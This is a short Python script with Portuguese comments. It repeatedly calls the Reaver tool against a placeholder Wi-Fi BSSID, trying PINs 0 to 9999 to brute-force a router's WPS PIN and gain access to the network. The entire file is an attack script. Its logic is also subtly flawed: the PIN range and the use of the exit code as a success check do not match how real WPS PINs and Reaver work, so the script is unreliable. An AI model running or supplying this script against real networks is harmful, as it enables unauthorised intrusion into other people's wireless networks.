import os

# Configurações de rede alvo
bssid = "AA:BB:CC:DD:EE:FF"
interface = "wlan0"
timeout = "120"
retry = "3"

# Loop para tentar todos os PINs possíveis
for pin in range(0, 10000):
    # Configurações do Reaver
    command = "reaver -i " + interface + " -b " + bssid + " -t " + timeout + " -r " + retry + " -p " + str(pin)

    # Executa o comando Reaver
    result = os.system(command)

    # Verifica se o PIN foi encontrado
    if result == 0:
        print("PIN encontrado: " + str(pin))
        break
    else:
        print("PIN " + str(pin) + " falhou")
